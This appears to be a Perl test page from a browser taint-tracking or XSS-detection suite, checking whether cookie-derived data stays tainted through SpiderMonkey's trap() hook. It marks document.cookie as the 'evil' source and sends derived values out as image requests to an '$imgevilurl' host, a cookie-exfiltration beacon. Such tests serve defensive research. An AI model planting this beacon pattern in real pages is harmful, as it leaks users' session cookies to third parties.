#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_TRAP";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var evil = 2;
		if ($evil) {
			evil = "43";
		}
		var notevil = "42";
		var notevil2 = "42";
		var notevil3 = evil;
		var dut = 7;
		var dut2 = 7;
		var dut3 = 7;

		// shouldn't be evil 

		function test() { 
			return notevil;
		}
		trap(test, 0, 'dut = 15;dut;');
		test();
		
		var url = "$imgevilurl?normal=" + dut;
		document.images[0].src = url;
		
		// if with evil val 
		
		function test2() { 
			return notevil2;
		}
		if ($evil) {
			trap(test2, 0, 'dut2 = 15;dut2;');
		}
		test2();
	
		var url2 = "$imgevilurl?if=" + dut2;
		document.images[1].src = url2;
		
		// normal usage 	

		function test3() { 
			return notevil3;
		}
		trap(test3, 0, 'dut3 = evil;dut3;');
		test3();

		var url3 = "$imgevilurl?isevil=" + dut3;
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";
